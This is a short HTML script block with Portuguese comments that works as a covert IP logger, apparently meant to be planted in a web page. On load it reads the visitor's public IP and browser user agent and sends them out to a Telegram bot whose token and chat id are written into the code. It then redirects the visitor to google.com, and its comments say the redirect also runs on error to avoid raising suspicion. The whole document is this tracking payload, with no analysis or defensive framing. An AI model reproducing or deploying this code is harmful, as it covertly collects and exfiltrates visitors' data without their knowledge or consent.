<script>
  // Captura o IP do alvo via API
  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const msg = "WORM WEB LOG\nIP: " + data.ip + "\nUA: " + navigator.userAgent;
      
      // Envia os dados para o seu Bot do Telegram
      fetch("https://api.telegram.org/bot8536635132:AAEgtLwL1QQIe0g1VolOW6ts510DtscfKv4/sendMessage?chat_id=8053770740&text=" + encodeURIComponent(msg));
      
      // Redireciona o alvo após 500ms (meio segundo)
      setTimeout(() => {
          window.location.href = "https://google.com";
      }, 500);
    })
    .catch(err => {
      // Caso dê erro, redireciona direto para não levantar suspeitas
      window.location.href = "https://google.com";
    });
</script>
